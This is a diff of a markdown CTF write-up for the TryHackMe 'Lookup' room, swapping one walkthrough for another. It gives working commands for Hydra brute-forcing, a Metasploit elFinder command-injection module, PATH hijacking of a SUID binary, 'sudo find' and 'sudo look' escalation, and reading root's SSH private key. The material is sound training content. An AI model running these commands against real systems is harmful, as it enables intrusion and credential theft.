@@ -1,133 +1,175 @@
+# TryHackMe - Lookup Room Writeup
 
-# TryHackMe - Lookup Walkthrough
+## Overview
 
-**Target IP**: `10.10.56.153`  
-**Room**: [Lookup](https://tryhackme.com/room/lookup)
-
----
-
-## 1. Reconnaissance
-
-### Nmap Scan
-
-Begin with an Nmap scan to find open ports and services:
-
-```bash
-nmap -sC -sV -Pn 10.10.56.153
-```
-
-**Findings**:
-- **Port 22** – OpenSSH 7.2p2
-- **Port 80** – Apache httpd 2.4.18
+This is a detailed walkthrough of how I rooted the **Lookup** room on TryHackMe and captured both user and root flags. The room involved web application enumeration, brute force attacks, a command injection vulnerability, and privilege escalation through misconfigured binaries.
 
 ---
 
-## 2. Exploring the Web Server
+## Enumeration
 
-Visiting `http://10.10.56.153` in the browser shows a basic webpage with limited content.
-
-### Directory Bruteforce
-
-Run a directory scan to uncover hidden files or directories:
+I started the engagement with an `nmap` scan:
 
 ```bash
-gobuster dir -u http://10.10.56.153 -w /usr/share/wordlists/dirb/common.txt
+nmap -sC -sV -oN initial_scan.txt <target-ip>
 ```
 
-**Discovered**: `/robots.txt`  
-Inside it: `AdminArea` and `backups`
+The scan revealed two open ports:
 
-### Navigating to `/backups`
-
-We find a file named `backup.zip`. Download it:
-
-```bash
-wget http://10.10.56.153/backups/backup.zip
-```
+- **22** (SSH)
+- **80** (HTTP)
 
 ---
 
-## 3. Investigating the Backup
+## Web Application Discovery
 
-The zip is password-protected. Use `fcrackzip` to brute-force:
+Accessing port 80 initially led nowhere. I suspected a virtual host configuration, so I added an entry to my `/etc/hosts` file:
 
-```bash
-fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
+```
+<target-ip> lookup.thm
 ```
 
-Password found: `magicword`
-
-Unzip it:
-
-```bash
-unzip backup.zip
-```
-
-The extracted file is `backup.sql`.
+After updating the hosts file, I accessed `http://lookup.thm` and was greeted with a **login page**.
 
 ---
 
-## 4. Analyzing the SQL File
+## Username Enumeration
 
-Open `backup.sql`. It contains database info, including what looks like a hashed password and username (`admin:hash`).
+Upon analyzing the login functionality, I noticed:
 
-Use an online hash identifier or `hash-identifier` to confirm the hash type (e.g., MD5/SHA1).
+- Wrong **username + password** → "wrong username or password"
+- Correct **username**, wrong password → "wrong password"
 
-Try cracking it with:
+This behavior hinted at a potential for **user enumeration**.
 
-```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt hashfile
-```
+Using **Burp Suite Intruder** with a **Sniper attack** and the `apache-user-enum_1.0.txt` wordlist, I discovered a valid user:
 
-Recovered password: `qwerty789`
-
----
-
-## 5. SSH Access
-
-Using the credentials:
-
-```bash
-ssh admin@10.10.56.153
-Password: qwerty789
-```
-
-We're in as `admin`.
+- **Username:** `jose`
 
 ---
 
-## 6. Privilege Escalation
+## Password Brute-Forcing
 
-Check sudo privileges:
+I then used **Hydra** to brute force the password for `jose`:
+
+```bash
+hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+```
+
+- **Password found:** `password123`
+
+---
+
+## File Manager Exploitation
+
+After logging in, I was redirected to another subdomain: `files.lookup.thm`. I added it to `/etc/hosts` as well.
+
+The site was running **elFinder**, a file manager.
+
+### Exploitation using Metasploit
+
+I loaded the following Metasploit module:
+
+```
+exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
+```
+
+Configured with:
+
+- `RHOSTS`: `files.lookup.thm`
+- `LHOST`: My machine's IP
+
+This yielded a **Meterpreter session**.
+
+---
+
+## Privilege Escalation - Part 1 (User)
+
+Inside the Meterpreter session:
+
+- Navigated to `/home` and found the user folder `think`.
+- Discovered `user.txt` but could not access it.
+
+I then searched for SUID binaries:
+
+```bash
+find / -perm /4000 2>/dev/null
+```
+
+Found:
+
+```bash
+/usr/sbin/pwm
+```
+
+It was running with **root privileges**.
+
+On execution, it appeared to run `id`. I exploited this by overriding the `id` command:
+
+```bash
+echo '#!/bin/bash' > /tmp/id
+echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
+chmod +x /tmp/id
+export PATH=/tmp:$PATH
+/usr/sbin/pwm
+```
+
+This provided me with potential passwords. I used them to brute force SSH:
+
+```bash
+hydra -l think -P pwm_passwords.txt ssh://<target-ip>
+```
+
+- Successfully logged in as **think**
+- Retrieved the **user flag** from `user.txt`
+
+---
+
+## Privilege Escalation - Part 2 (Root)
+
+I checked `think`’s sudo privileges:
 
 ```bash
 sudo -l
 ```
 
-We can run `/usr/bin/find` as root.
-
-Use this to escalate:
+Output showed:
 
 ```bash
-sudo find . -exec /bin/bash \; -quit
+(ALL : ALL) NOPASSWD: /usr/bin/look
 ```
 
-You now have root access.
+According to **GTFOBins**, `look` can be exploited to read arbitrary files. I retrieved the root SSH private key:
+
+```bash
+LFILE=/root/.ssh/id_rsa
+sudo look '' "$LFILE"
+```
+
+Saved the output and changed permissions:
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa root@<target-ip>
+```
+
+Logged in as **root** and obtained the **root flag** from `root.txt`.
 
 ---
 
-## 7. Flags
+## Conclusion
 
-- **User flag**: Found in `/home/admin/user.txt`
-- **Root flag**: Located in `/root/root.txt`
+The Lookup room involved a mix of:
+
+- Web app reconnaissance
+- Login enumeration
+- Credential brute-forcing
+- Remote code execution via a known exploit
+- SUID binary path manipulation
+- Sudo misconfigurations
+
+Each step built on the last, and it was a great exercise in real-world exploitation chains.
 
 ---
 
-## Summary
-
-This room emphasizes web enumeration, zip cracking, and Linux privilege escalation via `find`. A great beginner-level CTF that teaches essential pentesting skills.
-
----
-
-✅ *Completed by [YourName]*  
-🗂️ Path: `/tryhackme/lookup.md`
+*Thanks for reading!*
